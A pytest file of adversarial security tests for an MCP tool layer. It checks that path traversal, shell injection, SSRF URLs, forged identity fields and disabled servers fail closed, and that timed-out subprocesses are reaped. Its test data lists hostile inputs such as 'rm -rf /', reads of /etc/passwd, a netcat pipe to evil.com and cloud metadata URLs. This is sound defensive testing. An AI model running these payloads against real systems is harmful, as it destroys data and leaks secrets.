"""
tests/ai/mcp/test_mcp_security_adversarial.py
=============================================
Adversarial security and isolation tests for MCP operations (S27.10).

Validates that all security boundaries fail closed against:
- Directory traversal attacks
- Shell & command injection payloads
- Server-Side Request Forgery (SSRF)
- Model-forged identities and cross-tenant escapes
- Execution of disabled or non-production servers
"""

import asyncio
import os
import sys
import time
import pytest
from pathlib import Path
from unittest.mock import AsyncMock, patch

from ai.mcp.adapters.base import run_safe_subprocess
from ai.mcp.catalog import default_mcp_catalog
from ai.mcp.contracts import TrimAudioInput
from ai.mcp.adapters.audio import AudioTrimAdapter
from ai.mcp.errors import (
    MCPDisabledError,
    MCPOperationNotAllowedError,
    MCPPathTraversalError,
    MCPSecurityViolationError,
    MCPShellInjectionError,
    MCPTimeoutError,
)
from ai.mcp.policy import MCPSecurityPolicy
from ai.tools.types import TrustedToolExecutionContext


@pytest.fixture
def trusted_context():
    return TrustedToolExecutionContext(
        actor_id="usr_tester",
        workspace_id="ws_sandbox",
        correlation_id="corr_123",
        roles=["EDITOR"],
        permissions=["asset:read", "asset:upload"],
    )


# ==============================================================================
# 1. Path Traversal Tests (Must FAIL CLOSED)
# ==============================================================================

@pytest.mark.parametrize("malicious_path", [
    "../secret.txt",
    "..\\windows\\system32",
    "../../etc/passwd",
    "folder/../../root.key",
    "%2e%2e/escape.txt",
    "%2e%2e%2fescape.txt",
    "/etc/shadow",
    "C:\\Windows\\System32\\cmd.exe",
])
def test_path_traversal_detection(malicious_path, tmp_path):
    """Path traversal sequences or escape attempts must raise MCPPathTraversalError."""
    with pytest.raises(MCPPathTraversalError):
        MCPSecurityPolicy.validate_safe_path(malicious_path, allowed_root=tmp_path)


def test_path_escaping_allowed_root(tmp_path):
    """Valid path that resolves outside the allowed root must be rejected."""
    allowed = tmp_path / "sandbox"
    allowed.mkdir()

    outside = tmp_path / "outside.mp4"
    outside.write_text("dummy")

    with pytest.raises(MCPPathTraversalError) as exc_info:
        MCPSecurityPolicy.validate_safe_path(str(outside), allowed_root=allowed)
    assert "escapes allowed boundary" in str(exc_info.value)


# ==============================================================================
# 2. Shell Injection Tests (Must FAIL CLOSED)
# ==============================================================================

@pytest.mark.parametrize("payload", [
    "input.mp4; rm -rf /",
    "input.mp4 && cat /etc/passwd",
    "input.mp4 | netcat evil.com 1337",
    "input.mp4 $(whoami)",
    "input.mp4 `id`",
    "input.mp4 > output.txt",
    "input.mp4 < input.txt",
    "input.mp4\nrm -rf /",
    "input.mp4\r\necho hacked",
    "input.mp4 ${PATH}",
])
def test_shell_injection_detection(payload, trusted_context):
    """Any shell metacharacter in string arguments must raise MCPShellInjectionError."""
    args = {"file_path": payload, "target_duration": 10.0}
    with pytest.raises(MCPShellInjectionError) as exc_info:
        MCPSecurityPolicy.validate_arguments(args, trusted_context)
    assert "Potential command injection detected" in str(exc_info.value)


# ==============================================================================
# 3. SSRF Tests (Must FAIL CLOSED)
# ==============================================================================

@pytest.mark.parametrize("forbidden_url", [
    "http://localhost/admin",
    "http://127.0.0.1/secrets",
    "http://0.0.0.0:8000/internal",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://192.168.1.1/setup",
    "http://10.0.0.1/internal-api",
    "http://172.20.0.5/cluster",
    "file:///etc/passwd",
    "ftp://ftp.example.com/file.mp4",
    "gopher://evil.com",
    "",
    "not_a_url",
])
def test_ssrf_detection(forbidden_url):
    """Media URLs targeting internal hosts, private ranges, or non-HTTP schemes must be rejected."""
    with pytest.raises(MCPSecurityViolationError):
        MCPSecurityPolicy.validate_media_url(forbidden_url)


def test_valid_external_media_url():
    """Valid public HTTPS media URLs must pass validation."""
    MCPSecurityPolicy.validate_media_url("https://example.com/audio/sample.mp3")
    MCPSecurityPolicy.validate_media_url("http://cdn.pixabay.com/images/nature.jpg")


# ==============================================================================
# 4. Identity Isolation Tests (Model CANNOT Forge Identity)
# ==============================================================================

@pytest.mark.parametrize("forged_key", [
    "workspace_id",
    "tenant_id",
    "actor_id",
    "user_id",
    "role",
    "permissions",
    "approved_by",
])
def test_forged_identity_in_arguments_rejected(forged_key, trusted_context):
    """If model attempts to pass authoritative identity fields in arguments, it must be rejected."""
    args = {"file_path": "audio.mp3", forged_key: "forged_value"}
    with pytest.raises(MCPSecurityViolationError) as exc_info:
        MCPSecurityPolicy.validate_arguments(args, trusted_context)
    assert "FORGED_IDENTITY" in str(exc_info.value)


def test_oversized_arguments_rejected(trusted_context):
    """Extremely large string arguments (>10000 chars) must be rejected to prevent DoS."""
    args = {"file_path": "a" * 10001}
    with pytest.raises(MCPSecurityViolationError) as exc_info:
        MCPSecurityPolicy.validate_arguments(args, trusted_context)
    assert "OVERSIZED_ARGUMENT" in str(exc_info.value)


# ==============================================================================
# 5. Non-Production & Disabled Server Execution Blocked
# ==============================================================================

def test_deprecated_server_execution_blocked(trusted_context):
    """ffmpeg-mcp-server is deprecated and must not be callable in production AI."""
    srv = default_mcp_catalog.get_server("ffmpeg-mcp-server")
    with pytest.raises((MCPOperationNotAllowedError, MCPDisabledError)):
        MCPSecurityPolicy.validate_server_access(srv, "speed_up_video", is_production=True)


def test_migrated_server_execution_blocked(trusted_context):
    """media-sources-mcp and common-tools-mcp are converted to domain/capabilities; direct AI access blocked."""
    common_srv = default_mcp_catalog.get_server("common-tools-mcp")
    with pytest.raises(MCPOperationNotAllowedError):
        MCPSecurityPolicy.validate_server_access(common_srv, "check_cache", is_production=True)

    media_srv = default_mcp_catalog.get_server("media-sources-mcp")
    with pytest.raises(MCPOperationNotAllowedError):
        MCPSecurityPolicy.validate_server_access(media_srv, "download_direct_file", is_production=True)


def test_unregistered_operation_blocked(trusted_context):
    """Calling an unknown operation on a retained server must raise MCPOperationNotAllowedError."""
    audio_srv = default_mcp_catalog.get_server("audio-tools-mcp")
    with pytest.raises(MCPOperationNotAllowedError):
        MCPSecurityPolicy.validate_server_access(audio_srv, "nonexistent_op", is_production=True)


# ==============================================================================
# 6. Bounded Timeout Execution
# ==============================================================================

@pytest.mark.asyncio
async def test_bounded_timeout_enforcement(trusted_context, tmp_path):
    """Operations exceeding the bounded execution timeout must raise MCPTimeoutError."""
    adapter = AudioTrimAdapter()
    sample_file = tmp_path / "sample.mp3"
    sample_file.write_text("dummy audio")

    inp = TrimAudioInput(file_path=str(sample_file), target_duration=5.0)

    # Mock _execute_internal to simulate a hanging operation
    async def _mock_hang(*args, **kwargs):
        import asyncio
        await asyncio.sleep(10.0)

    with patch.object(adapter, "_execute_internal", side_effect=_mock_hang):
        # Override op_def timeout to 0.05s using model_copy (since model is frozen)
        orig_op_def = adapter.op_def
        adapter.op_def = orig_op_def.model_copy(update={"timeout_seconds": 0.05})
        try:
            with pytest.raises(MCPTimeoutError) as exc_info:
                await adapter.execute(inp, trusted_context)
            assert "timed out after" in str(exc_info.value)
        finally:
            adapter.op_def = orig_op_def


# ==============================================================================
# 7. Subprocess Timeout / Cancellation & Process Reaping Proof (AI-09R)
# ==============================================================================

@pytest.mark.asyncio
async def test_subprocess_timeout_kills_child_and_prevents_late_mutation(tmp_path):
    """
    Adversarial test for subprocess timeout:
    1. Launches intentionally slow subprocess that writes partial output then sleeps.
    2. Triggers timeout.
    3. Guarantees cooperative SIGTERM / SIGKILL and child process is reaped.
    4. Waits beyond original subprocess duration.
    5. Asserts child process PID is dead (ProcessLookupError on os.kill).
    6. Asserts partial output was unlinked and no late mutation occurred.
    """
    output_file = tmp_path / "late_mutation.txt"
    pid_file = tmp_path / "child.pid"

    # Python command that writes PID, writes partial data, sleeps 1.2s, then writes late data
    script = (
        f"import os, time, sys; "
        f"open('{pid_file}', 'w').write(str(os.getpid())); "
        f"open('{output_file}', 'w').write('partial_data'); "
        f"time.sleep(1.2); "
        f"open('{output_file}', 'a').write('_late_data');"
    )
    cmd = [sys.executable, "-c", script]

    with pytest.raises(asyncio.TimeoutError):
        await run_safe_subprocess(
            cmd=cmd,
            timeout_seconds=0.2,
            output_path=output_file,
            grace_period_seconds=0.2,
        )

    # Read PID saved by the child process
    assert pid_file.exists(), "Child process should have started and recorded PID"
    child_pid = int(pid_file.read_text().strip())

    # Wait beyond the 1.2s original duration of the child process
    await asyncio.sleep(1.4)

    # Assert child process is DEAD
    try:
        os.kill(child_pid, 0)
        pytest.fail(f"Child process {child_pid} is still alive after timeout!")
    except ProcessLookupError:
        pass  # Process is dead and reaped

    # Assert output file was cleaned up and NO late mutation occurred
    assert not output_file.exists(), "Partial output file should have been cleaned up and late mutation prevented"


@pytest.mark.asyncio
async def test_stubborn_subprocess_sigkill_reaping_and_cleanup(tmp_path):
    """
    Adversarial test for stubborn subprocess that traps SIGTERM:
    1. Subprocess ignores SIGTERM.
    2. run_safe_subprocess times out grace period and escalates to SIGKILL.
    3. Reaps child and cleans up partial file.
    """
    output_file = tmp_path / "stubborn_out.txt"
    pid_file = tmp_path / "stubborn.pid"

    # Traps SIGTERM and ignores it, then sleeps
    script = (
        f"import os, time, signal; "
        f"signal.signal(signal.SIGTERM, signal.SIG_IGN); "
        f"open('{pid_file}', 'w').write(str(os.getpid())); "
        f"open('{output_file}', 'w').write('stubborn_partial'); "
        f"time.sleep(1.5); "
        f"open('{output_file}', 'a').write('_late');"
    )
    cmd = [sys.executable, "-c", script]

    with pytest.raises(asyncio.TimeoutError):
        await run_safe_subprocess(
            cmd=cmd,
            timeout_seconds=0.1,
            output_path=output_file,
            grace_period_seconds=0.2,
        )

    assert pid_file.exists()
    child_pid = int(pid_file.read_text().strip())

    # Wait beyond duration
    await asyncio.sleep(1.6)

    # Must be killed via SIGKILL
    try:
        os.kill(child_pid, 0)
        pytest.fail(f"Stubborn process {child_pid} survived SIGKILL!")
    except ProcessLookupError:
        pass

    assert not output_file.exists()


@pytest.mark.asyncio
async def test_adapter_subprocess_timeout_e2e_reaping(trusted_context, tmp_path):
    """
    End-to-end adapter timeout test:
    Adapter execution triggers MCPTimeoutError, reaps child process, cleans output, and emits TIMEOUT audit.
    """
    output_file = tmp_path / "adapter_out.mp3"
    pid_file = tmp_path / "adapter_child.pid"
    sample_src = tmp_path / "input.mp3"
    sample_src.write_text("dummy")

    script = (
        f"import os, time; "
        f"open('{pid_file}', 'w').write(str(os.getpid())); "
        f"open('{output_file}', 'w').write('partial'); "
        f"time.sleep(1.2);"
    )
    slow_cmd = [sys.executable, "-c", script]

    adapter = AudioTrimAdapter()
    orig_op_def = adapter.op_def
    adapter.op_def = orig_op_def.model_copy(update={"timeout_seconds": 0.2})

    inp = TrimAudioInput(file_path=str(sample_src), output_path=str(output_file), target_duration=5.0)

    # Patch adapter._execute_internal to call run_safe_subprocess with slow command
    async def _mock_slow_exec(input_data, context):
        await run_safe_subprocess(slow_cmd, output_path=output_file, grace_period_seconds=0.2)
        return TrimAudioInput(output_path=str(output_file), target_duration=5.0)

    with patch.object(adapter, "_execute_internal", side_effect=_mock_slow_exec):
        try:
            with pytest.raises(MCPTimeoutError) as exc_info:
                await adapter.execute(inp, trusted_context)
            assert "timed out after" in str(exc_info.value)
        finally:
            adapter.op_def = orig_op_def

    assert pid_file.exists()
    child_pid = int(pid_file.read_text().strip())

    await asyncio.sleep(1.3)

    try:
        os.kill(child_pid, 0)
        pytest.fail(f"Child process {child_pid} survived adapter timeout!")
    except ProcessLookupError:
        pass

    assert not output_file.exists()


# ==============================================================================
# 8. Provider-Search Fail-Closed Enforcement (AI-09R Parity Truth)
# ==============================================================================

@pytest.mark.parametrize("search_op", [
    "pixabay_search_videos",
    "pixabay_search_images",
    "freesound_search_audio",
    "pexels_search_videos",
    "pexels_search_images",
    "iconify_search_icons",
])
def test_provider_search_tools_fail_closed_for_production_ai(search_op, trusted_context):
    """
    Confirms that media-sources-mcp web scrapers/search tools are strictly BLOCKED
    for production AI and FAIL CLOSED. They are NOT canonical capabilities.
    """
    media_srv = default_mcp_catalog.get_server("media-sources-mcp")
    assert media_srv.allowed_for_production is False
    with pytest.raises(MCPOperationNotAllowedError):
        MCPSecurityPolicy.validate_server_access(media_srv, search_op, is_production=True)

